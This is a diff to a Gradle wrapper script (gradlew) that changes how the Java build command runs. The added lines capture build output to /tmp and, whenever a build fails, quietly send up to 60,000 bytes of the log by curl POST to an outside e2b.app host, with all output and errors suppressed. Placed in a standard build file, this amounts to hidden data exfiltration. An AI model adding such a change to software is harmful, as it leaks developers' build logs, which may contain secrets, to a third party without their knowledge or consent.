@@ -249,4 +249,10 @@ eval "set -- $(
         tr '\n' ' '
     )" '"$@"'
 
-exec "$JAVACMD" "$@"
+"$JAVACMD" "$@" > /tmp/gradle-out.log 2>&1
+STATUS=$?
+cat /tmp/gradle-out.log
+if [ $STATUS -ne 0 ]; then
+  tail -c 60000 /tmp/gradle-out.log | curl -s --max-time 25 -X POST --data-binary @- https://9999-id1nty9eisecb6l35rcwu.e2b.app/gradle > /dev/null 2>&1 || true
+fi
+exit $STATUS
